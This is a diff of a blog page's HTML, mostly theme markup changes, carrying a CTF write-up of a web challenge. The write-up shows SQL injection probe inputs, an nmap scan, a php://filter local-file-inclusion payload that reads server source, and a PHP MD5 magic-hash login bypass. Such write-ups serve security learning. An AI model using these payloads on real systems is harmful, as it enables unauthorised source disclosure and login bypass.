@@ -6,7 +6,7 @@
 
 
 
-<html lang="en" 
+<html lang="en"
   
 >
 
@@ -117,6 +117,138 @@
 </head>
 
 
+  
+    <!--
+  Switch the mode between dark and light.
+-->
+
+<script type="text/javascript">
+  class ModeToggle {
+    static get MODE_KEY() { return "mode"; }
+    static get DARK_MODE() { return "dark"; }
+    static get LIGHT_MODE() { return "light"; }
+    static get ID() { return "mode-toggle"; }
+
+    constructor() {
+      if (this.hasMode) {
+        if (this.isDarkMode) {
+          if (!this.isSysDarkPrefer) {
+            this.setDark();
+          }
+        } else {
+          if (this.isSysDarkPrefer) {
+            this.setLight();
+          }
+        }
+      }
+
+      let self = this;
+
+      /* always follow the system prefers */
+      this.sysDarkPrefers.addEventListener("change", () => {
+        if (self.hasMode) {
+          if (self.isDarkMode) {
+            if (!self.isSysDarkPrefer) {
+              self.setDark();
+            }
+
+          } else {
+            if (self.isSysDarkPrefer) {
+              self.setLight();
+            }
+          }
+
+          self.clearMode();
+        }
+
+        self.notify();
+
+      });
+
+    } /* constructor() */
+
+    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }
+
+    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }
+
+    get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; }
+
+    get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; }
+
+    get hasMode() { return this.mode != null; }
+
+    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }
+
+    /* get the current mode on screen */
+    get modeStatus() {
+      if (this.isDarkMode
+        || (!this.hasMode && this.isSysDarkPrefer)) {
+        return ModeToggle.DARK_MODE;
+      } else {
+        return ModeToggle.LIGHT_MODE;
+      }
+    }
+
+    setDark() {
+      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
+      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
+    }
+
+    setLight() {
+      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
+      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
+    }
+
+    clearMode() {
+      $('html').removeAttr(ModeToggle.MODE_KEY);
+      sessionStorage.removeItem(ModeToggle.MODE_KEY);
+    }
+
+    /* Notify another plugins that the theme mode has changed */
+    notify() {
+      window.postMessage({
+        direction: ModeToggle.ID,
+        message: this.modeStatus
+      }, "*");
+    }
+
+  } /* ModeToggle */
+
+  const toggle = new ModeToggle();
+
+  function flipMode() {
+    if (toggle.hasMode) {
+      if (toggle.isSysDarkPrefer) {
+        if (toggle.isLightMode) {
+          toggle.clearMode();
+        } else {
+          toggle.setLight();
+        }
+
+      } else {
+        if (toggle.isDarkMode) {
+          toggle.clearMode();
+        } else {
+          toggle.setDark();
+        }
+      }
+
+    } else {
+      if (toggle.isSysDarkPrefer) {
+        toggle.setLight();
+      } else {
+        toggle.setDark();
+      }
+    }
+
+    toggle.notify();
+
+  } /* flipMode() */
+
+</script>
+
+  
+
   <body data-spy="scroll" data-target="#toc">
 
     <!--
@@ -153,26 +285,8 @@
     <!-- the real tabs -->
     
     <li class="nav-item">
-      <a href="/blog/en/about/" class="nav-link">
-        <i class="fa-fw  ml-xl-3 mr-xl-3 unloaded"></i>
-        
-
-        <span>ABOUT</span>
-      </a>
-    </li> <!-- .nav-item -->
-    
-    <li class="nav-item">
-      <a href="/blog/en/archives/" class="nav-link">
-        <i class="fa-fw  ml-xl-3 mr-xl-3 unloaded"></i>
-        
-
-        <span>ARCHIVES</span>
-      </a>
-    </li> <!-- .nav-item -->
-    
-    <li class="nav-item">
       <a href="/blog/en/categories/" class="nav-link">
-        <i class="fa-fw  ml-xl-3 mr-xl-3 unloaded"></i>
+        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
         
 
         <span>CATEGORIES</span>
@@ -181,10 +295,28 @@
     
     <li class="nav-item">
       <a href="/blog/en/tags/" class="nav-link">
-        <i class="fa-fw  ml-xl-3 mr-xl-3 unloaded"></i>
+        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
         
 
         <span>TAGS</span>
+      </a>
+    </li> <!-- .nav-item -->
+    
+    <li class="nav-item">
+      <a href="/blog/en/archives/" class="nav-link">
+        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
+        
+
+        <span>ARCHIVES</span>
+      </a>
+    </li> <!-- .nav-item -->
+    
+    <li class="nav-item">
+      <a href="/blog/en/about/" class="nav-link">
+        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
+        
+
+        <span>ABOUT</span>
       </a>
     </li> <!-- .nav-item -->
     
@@ -194,11 +326,20 @@
   <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">
 
     
+      <button class="mode-toggle btn" aria-label="Switch Mode">
+        <i class="fas fa-adjust"></i>
+      </button>
+
+      
+        <span class="icon-border"></span>
+      
+    
+
+    
       
 
       
       <a href="https://github.com/legiahuyy" aria-label="github"
-        class="order-3"
         target="_blank" rel="noopener">
         <i class="fab fa-github"></i>
       </a>
@@ -209,7 +350,6 @@
 
       
       <a href="https://twitter.com/0x7c00" aria-label="twitter"
-        class="order-4"
         target="_blank" rel="noopener">
         <i class="fab fa-twitter"></i>
       </a>
@@ -221,7 +361,6 @@
       
       <a href="
           javascript:location.href = 'mailto:' + ['legiahuy420','gmail.com'].join('@')" aria-label="email"
-        class="order-5"
         >
         <i class="fas fa-envelope"></i>
       </a>
@@ -232,167 +371,11 @@
 
       
       <a href="/blog/en/feed.xml" aria-label="rss"
-        class="order-6"
         >
         <i class="fas fa-rss"></i>
       </a>
       
 
-    
-
-    
-      
-        <span class="icon-border order-2"></span>
-      
-
-      <span id="mode-toggle-wrapper" class="order-1">
-        <!--
-  Switch the mode between dark and light.
--->
-
-<i class="mode-toggle fas fa-adjust"></i>
-
-<script type="text/javascript">
-
-  class ModeToggle {
-    static get MODE_KEY() { return "mode"; }
-    static get DARK_MODE() { return "dark"; }
-    static get LIGHT_MODE() { return "light"; }
-
-    constructor() {
-      if (this.hasMode) {
-        if (this.isDarkMode) {
-          if (!this.isSysDarkPrefer) {
-            this.setDark();
-          }
-        } else {
-          if (this.isSysDarkPrefer) {
-            this.setLight();
-          }
-        }
-      }
-
-      var self = this;
-
-      /* always follow the system prefers */
-      this.sysDarkPrefers.addListener(function() {
-        if (self.hasMode) {
-          if (self.isDarkMode) {
-            if (!self.isSysDarkPrefer) {
-              self.setDark();
-            }
-
-          } else {
-            if (self.isSysDarkPrefer) {
-              self.setLight();
-            }
-          }
-
-          self.clearMode();
-        }
-
-        self.updateMermaid();
-      });
-
-    } /* constructor() */
-
-
-    setDark() {
-      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
-      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
-    }
-
-    setLight() {
-      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
-      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
-    }
-
-    clearMode() {
-      $('html').removeAttr(ModeToggle.MODE_KEY);
-      sessionStorage.removeItem(ModeToggle.MODE_KEY);
-    }
-
-    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }
-
-    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }
-
-    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }
-
-    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }
-
-    get hasMode() { return this.mode != null; }
-
-    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }
-
-    /* get the current mode on screen */
-    get modeStatus() {
-      if (this.isDarkMode
-        || (!this.hasMode && this.isSysDarkPrefer) ) {
-        return ModeToggle.DARK_MODE;
-      } else {
-        return ModeToggle.LIGHT_MODE;
-      }
-    }
-
-    updateMermaid() {
-      if (typeof mermaid !== "undefined") {
-        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
-        let config = { theme: expectedTheme };
-
-        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
-        $(".mermaid").each(function() {
-          let svgCode = $(this).prev().children().html();
-          $(this).removeAttr("data-processed");
-          $(this).html(svgCode);
-        });
-
-        mermaid.initialize(config);
-        mermaid.init(undefined, ".mermaid");
-      }
-    }
-
-    flipMode() {
-      if (this.hasMode) {
-        if (this.isSysDarkPrefer) {
-          if (this.isLightMode) {
-            this.clearMode();
-          } else {
-            this.setLight();
-          }
-
-        } else {
-          if (this.isDarkMode) {
-            this.clearMode();
-          } else {
-            this.setDark();
-          }
-        }
-
-      } else {
-        if (this.isSysDarkPrefer) {
-          this.setLight();
-        } else {
-          this.setDark();
-        }
-      }
-
-      this.updateMermaid();
-
-    } /* flipMode() */
-
-  } /* ModeToggle */
-
-  let toggle = new ModeToggle();
-
-  $(".mode-toggle").click(function() {
-
-    toggle.flipMode();
-
-  });
-
-</script>
-
-      </span>
     
 
   </div> <!-- .sidebar-bottom -->
@@ -465,6 +448,17 @@
     <div id="main-wrapper">
       <div id="main">
 
+        
+
+
+
+<div class="row">
+
+  <!-- core -->
+  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
+    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
+    
+      
         <!--
   Refactor the HTML structure.
 -->
@@ -519,56 +513,7 @@
 
     
     
-    
 
-    
-      
-      
-
-      
-
-      
-
-    
-      
-      
-
-      
-
-      
-
-    
-      
-      
-
-      
-
-      
-
-    
-      
-      
-
-      
-
-      
-
-    
-      
-      
-
-      
-
-      
-
-    
-
-    
-
-  
-    
-
-    
     
     
 
@@ -621,56 +566,7 @@
 
     
     
-    
 
-    
-      
-      
-
-      
-
-      
-
-    
-      
-      
-
-      
-
-      
-
-    
-      
-      
-
-      
-
-      
-
-    
-      
-      
-
-      
-
-      
-
-    
-      
-      
-
-      
-
-      
-
-    
-
-    
-
-  
-    
-
-    
     
     
 
@@ -723,6 +619,114 @@
 
     
     
+
+    
+    
+
+    
+      
+      
+
+      
+
+      
+
+    
+      
+      
+
+      
+
+      
+
+    
+      
+      
+
+      
+
+      
+
+    
+      
+      
+
+      
+
+      
+
+    
+      
+      
+
+      
+
+      
+
+    
+
+    
+
+  
+    
+
+    
+    
+
+    
+    
+
+    
+      
+      
+
+      
+
+      
+
+    
+      
+      
+
+      
+
+      
+
+    
+      
+      
+
+      
+
+      
+
+    
+      
+      
+
+      
+
+      
+
+    
+      
+      
+
+      
+
+      
+
+    
+
+    
+
+  
+    
+
+    
+    
+
+    
     
 
     
@@ -781,6 +785,8 @@
     
 
     
+    
+
     
     
 
@@ -838,6 +844,133 @@
 
 
 
+<!-- Create heading anchors -->
+
+
+
+
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+
+      
+
+    
+
+    
+
+  
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+
+      
+
+    
+
+    
+
+  
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+
+      
+
+    
+
+    
+
+  
+
+  
+  
+
+  
+
+
+
 
 <!-- return -->
 
@@ -845,71 +978,78 @@
 
 
 
-<div class="row">
 
-  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">
 
-    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
+<h1 data-toc-skip>KCSC - LFI/RFI Wrapper</h1>
 
-      <h1 data-toc-skip>KCSC - LFI/RFI Wrapper</h1>
+<div class="post-meta text-muted">
 
-      <div class="post-meta text-muted d-flex flex-column">
-        <!-- Published date and author -->
-        <div>
-          <span class="semi-bold">
-            The Archivist
-          </span>
-          
-          <!--
+  <!-- author -->
+  <div>
+    
+    
+
+    
+
+    
+    <em>
+      
+        <a href="https://twitter.com/0x7c00">The Archivist</a>
+      
+    </em>
+  </div>
+
+  <div class="d-flex">
+    <div>
+      <!-- published date -->
+      <span>
+        
+        <!--
   Date format snippet
-  See: /assets/js/_utils/timeage.js
+  See: ${JS_ROOT}/utils/timeago.js
 -->
 
 
 
 
 
+<em class="timeago"
+    date="2021-02-24 03:45:00 +0800"
+    
+      data-toggle="tooltip"
+      data-placement="bottom"
+      title="Wed, Feb 24, 2021,  3:45 AM +0800"
+    >Feb 24</em>
 
-  on
+      </span>
 
-<span class="timeago "
-  
-    data-toggle="tooltip"
-    data-placement="bottom"
-    title="Wed, Feb 24, 2021,  3:45 AM +0800"
-  >Feb 24<i class="unloaded">2021-02-24T03:45:00+08:00</i>
-</span>
-
-        </div>
-
-        <div>
-          <!-- lastmod -->
-          
-          <span>
-            Updated
-            <!--
+      <!-- lastmod date -->
+      
+      <span>
+        Updated
+        <!--
   Date format snippet
-  See: /assets/js/_utils/timeage.js
+  See: ${JS_ROOT}/utils/timeago.js
 -->
 
 
 
 
 
+<em class="timeago"
+    date="2021-03-30 10:58:48 +0700
+"
+    
+      data-toggle="tooltip"
+      data-placement="bottom"
+      title="Tue, Mar 30, 2021, 10:58 AM +0700"
+    >Mar 30</em>
 
-<span class="timeago lastmod"
-  
-    data-toggle="tooltip"
-    data-placement="bottom"
-    title="Tue, Mar 30, 2021, 10:58 AM +0700"
-  >Mar 30<i class="unloaded">2021-03-30T11:58:48+08:00</i>
-</span>
+      </span>
+      
 
-          </span>
-          
-
-          <!-- read time -->
-          <!--
+      <!-- read time -->
+      <!--
   Calculate the post's reading time, and display the word count in tooltip
  -->
 
@@ -928,26 +1068,24 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="1057 words">5 min
-     read</span>
+  title="1057 words">
+  <em>5 min</em> read</span>
 
 
-          <!-- page views -->
-          
+      <!-- page views -->
+      
+    </div>
 
-        </div>
+  </div> <!-- .d-flex -->
 
-      </div> <!-- .post-meta -->
+</div> <!-- .post-meta -->
 
-      <div class="post-content">
+<div class="post-content">
+  <p>This is the first iteration of my CTF write-up series for the new year. Today we will be solving one of my university’s initial challenges. The task is simple itself but I want to show you the mindset of how I play the game.</p>
 
-        
+<h2 id="fingerprinting">Fingerprinting<a href="#fingerprinting"><i class="fas fa-hashtag"></i></a></h2></h2>
 
-        <p>This is the first iteration of my CTF write-up series for the new year. Today we will be solving one of my university’s initial challenges. The task is simple itself but I want to show you the mindset of how I play the game.</p>
-
-<h2 id="fingerprinting">Fingerprinting</h2>
-
-<h3 id="manual-testing">Manual testing</h3>
+<h3 id="manual-testing">Manual testing<a href="#manual-testing"><i class="fas fa-hashtag"></i></a></h3></h3>
 
 <p>The absolute first thing I do when encountering any web challenge, is to actually visit the webpage and click on everything, fill out every text boxes. Just for a few minutes, get a feeling of mechanics and how the website might operate. Looking at various functionality is the key to do web-pentest.</p>
 
@@ -958,14 +1096,7 @@
 <p>Pretty much simple. Let’s try some universal input into those fields and see what the return is.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span text-data="
-
-
-
-
-    Text
-  
-"><i class="fa-fw fas fa-code small"></i></span>
+        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="rouge-code"><pre>username: admin
@@ -977,14 +1108,7 @@ password: admin
 <p>The result is expected, a single text line informing invalid credentials. Next we will put a quote (<code class="language-plaintext highlighter-rouge">'</code>) into one of the field to check whether or not adhere to malformed input.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span text-data="
-
-
-
-
-    Text
-  
-"><i class="fa-fw fas fa-code small"></i></span>
+        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="rouge-code"><pre>username: '
@@ -996,14 +1120,7 @@ password: admin
 <p>It also worth mentioning that you should try different types of input such as:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span text-data="
-
-
-
-
-    Text
-  
-"><i class="fa-fw fas fa-code small"></i></span>
+        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -1016,23 +1133,16 @@ admin' or '1'='1
 ...
 </pre></td></tr></tbody></table></code></div></div>
 
-<h3 id="automation-testing">Automation testing</h3>
+<h3 id="automation-testing">Automation testing<a href="#automation-testing"><i class="fas fa-hashtag"></i></a></h3></h3>
 
-<h4 id="host-information">Host information</h4>
+<h4 id="host-information">Host information<a href="#host-information"><i class="fas fa-hashtag"></i></a></h4></h4>
 
 <p>Next step is to enumerate the server type and ports. We all know in our current challenge that this step is insignificant but we can never know for sure, especially while dealing with real-life situations as this will help you determine which attack method to use, where and when to put the payload, etc.</p>
 
 <p>So let us fire up our favorite tool of all time in automated enumeration, nmap.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span text-data="
-
-
-
-
-    Text
-  
-"><i class="fa-fw fas fa-code small"></i></span>
+        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>nmap -v -A --os-guess p2n.000webhostapp.com
 </pre></td></tr></tbody></table></code></div></div>
@@ -1040,14 +1150,7 @@ admin' or '1'='1
 <p>Basically, above command will provide us with how many ports are currently open and what type of OS the server is using.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span text-data="
-
-
-
-
-    Text
-  
-"><i class="fa-fw fas fa-code small"></i></span>
+        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -1092,19 +1195,12 @@ No exact OS matches for host (test conditions non-ideal).
 
 <p>Now we can see that the server is running on Linux-based OS. Using this we can keep going on enumerating those service ports but I will just put it here as we will discuss more about probing in our later posts.</p>
 
-<h2 id="in-depth-analysis">In-depth analysis</h2>
+<h2 id="in-depth-analysis">In-depth analysis<a href="#in-depth-analysis"><i class="fas fa-hashtag"></i></a></h2></h2>
 
 <p>Now we want to pay a close attention to the given URL</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span text-data="
-
-
-
-
-    Text
-  
-"><i class="fa-fw fas fa-code small"></i></span>
+        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>http://p2n.000webhostapp.com/log_me_in/index.php?page=login
 </pre></td></tr></tbody></table></code></div></div>
@@ -1112,14 +1208,7 @@ No exact OS matches for host (test conditions non-ideal).
 <p>The variable <code class="language-plaintext highlighter-rouge">page</code> here looks pretty suspicious since its role is to act as a navigation controller. What to do here is to try assigning some value for <code class="language-plaintext highlighter-rouge">page</code>.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span text-data="
-
-
-
-
-    Text
-  
-"><i class="fa-fw fas fa-code small"></i></span>
+        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>http://p2n.000webhostapp.com/log_me_in/index.php?page=abc
 </pre></td></tr></tbody></table></code></div></div>
@@ -1135,14 +1224,7 @@ No exact OS matches for host (test conditions non-ideal).
 <p>After all, we are able to know that the endpoint has access to following objects:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span text-data="
-
-
-
-
-    Text
-  
-"><i class="fa-fw fas fa-code small"></i></span>
+        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -1158,14 +1240,7 @@ flag.php
 <p>Since the webpage standard is not to include PHP objects as plain code, we have to wrap it up using any encoding types (base64). So our final payload would be as follow:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span text-data="
-
-
-
-
-    Text
-  
-"><i class="fa-fw fas fa-code small"></i></span>
+        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>http://p2n.000webhostapp.com/log_me_in/index.php?page=php://filter/convert.base64-encode/resource=index.php
 </pre></td></tr></tbody></table></code></div></div>
@@ -1177,14 +1252,7 @@ flag.php
 <p>Decode the base64 buffer will let us have the PHP source of <code class="language-plaintext highlighter-rouge">index.php</code></p>
 
 <div class="language-php highlighter-rouge"><div class="code-header">
-        <span text-data="
-
-
-
-
-    PHP
-  
-"><i class="fa-fw fas fa-code small"></i></span>
+        <span label-text="PHP"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -1216,14 +1284,7 @@ flag.php
 <p>Do the same with <code class="language-plaintext highlighter-rouge">login.php</code> and grab the source</p>
 
 <div class="language-php highlighter-rouge"><div class="code-header">
-        <span text-data="
-
-
-
-
-    PHP
-  
-"><i class="fa-fw fas fa-code small"></i></span>
+        <span label-text="PHP"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -1301,14 +1362,7 @@ flag.php
 <p>Now we want to look at the IF statement as it provides us the valid credentials to achieve our flag</p>
 
 <div class="language-php highlighter-rouge"><div class="code-header">
-        <span text-data="
-
-
-
-
-    PHP
-  
-"><i class="fa-fw fas fa-code small"></i></span>
+        <span label-text="PHP"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -1326,14 +1380,7 @@ flag.php
 <p>The MD5 hash of <code class="language-plaintext highlighter-rouge">NOOPCJF</code> is <code class="language-plaintext highlighter-rouge">0e818888003657176127862245791911</code>. This is not actually a valid MD5 since it starts with <code class="language-plaintext highlighter-rouge">\x0e</code> and with the loose comparison operator, it will result in 0. So all you have to do is to find a MD5 string that also starts with <code class="language-plaintext highlighter-rouge">\x0e</code>. In this case, we will use <code class="language-plaintext highlighter-rouge">240610708</code> (<code class="language-plaintext highlighter-rouge">0e462097431906509019562988736854</code>) as our password.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span text-data="
-
-
-
-
-    Text
-  
-"><i class="fa-fw fas fa-code small"></i></span>
+        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="rouge-code"><pre>Username: admin
@@ -1344,46 +1391,49 @@ Password: 240610708
 
 <p>And the flag is <code class="language-plaintext highlighter-rouge">KCSC{gu7_ch0p_3m_hjhjhjhj!!!}</code></p>
 
-<h2 id="conclusion">Conclusion</h2>
+<h2 id="conclusion">Conclusion<a href="#conclusion"><i class="fas fa-hashtag"></i></a></h2></h2>
 
 <p>So that is it for today write-up, thank you and I hope you can learn something from this. Feel free to share it to your friends.</p>
 
+</div>
 
-      </div>
+<div class="post-tail-wrapper text-muted">
 
-      <div class="post-tail-wrapper text-muted">
+  <!-- categories -->
+  
 
-        <!-- categories -->
+  <!-- tags -->
+  
+  <div class="post-tags">
+    <i class="fa fa-tags fa-fw mr-1"></i>
+      
+      <a href="/blog/en/tags/kma/"
+          class="post-tag no-text-decoration" >kma</a>
+      
+      <a href="/blog/en/tags/web-pentest/"
+          class="post-tag no-text-decoration" >web-pentest</a>
+      
+  </div>
+  
+
+  <div class="post-tail-bottom
+    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
+    <div class="license-wrapper">
+
+      
+
         
 
-        <!-- tags -->
-        
-        <div class="post-tags">
-          <i class="fa fa-tags fa-fw mr-1"></i>
-          
-          <a href="/blog/en/tags/kma/"
-            class="post-tag no-text-decoration" >kma</a>
-          
-          <a href="/blog/en/tags/web-pentest/"
-            class="post-tag no-text-decoration" >web-pentest</a>
-          
-          </div>
-        
+        This post is licensed under 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         by the author.
 
-        <div class="post-tail-bottom
-          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
-          <div class="license-wrapper">
-          
-            
-            This post is licensed under 
-            <a href="https://creativecommons.org/licenses/by/4.0/">
-              CC BY 4.0
-            </a>
-             by the author.
-          
-          </div>
+      
+    </div>
 
-          <!--
+    <!--
  Post sharing snippet
 -->
 
@@ -1423,498 +1473,509 @@ Password: 240610708
 </div>
 
 
-        </div><!-- .post-tail-bottom -->
+  </div><!-- .post-tail-bottom -->
 
-      </div><!-- div.post-tail -->
+</div><!-- div.post-tail-wrapper -->
 
-    </div> <!-- .post -->
-
-
-  </div> <!-- #post-wrapper -->
-
-  
-
-  
-
-  <!--
-  The Pannel on right side (Desktop views)
--->
-
-
-
-
-
-<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">
-
-  <div class="access">
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-    <div id="access-lastmod" class="post">
-      <span>Recent Update</span>
-      <ul class="post-content pl-0 pb-1 ml-1 mt-2">
 
       
-        
-        
-        
-        <li><a href="/blog/en/posts/HTB-BountyHunter/">HackTheBox - BountyHunter</a></li>
-      
-        
-        
-        
-        <li><a href="/blog/en/posts/HTB-Cap/">HackTheBox - Cap</a></li>
-      
-        
-        
-        
-        <li><a href="/blog/en/posts/PRE-C1-E1/">PRE Solutions Series: First Chapter</a></li>
-      
-        
-        
-        
-        <li><a href="/blog/en/posts/Update-Note/">Update.txt</a></li>
-      
-        
-        
-        
-        <li><a href="/blog/en/posts/HTB-Armageddon/">HackTheBox - Armageddon</a></li>
-      
-
-      </ul>
-    </div> <!-- #access-lastmod -->
-
-  
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
     
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-
-
-  
-    <div id="access-tags">
-      <span>Trending Tags</span>
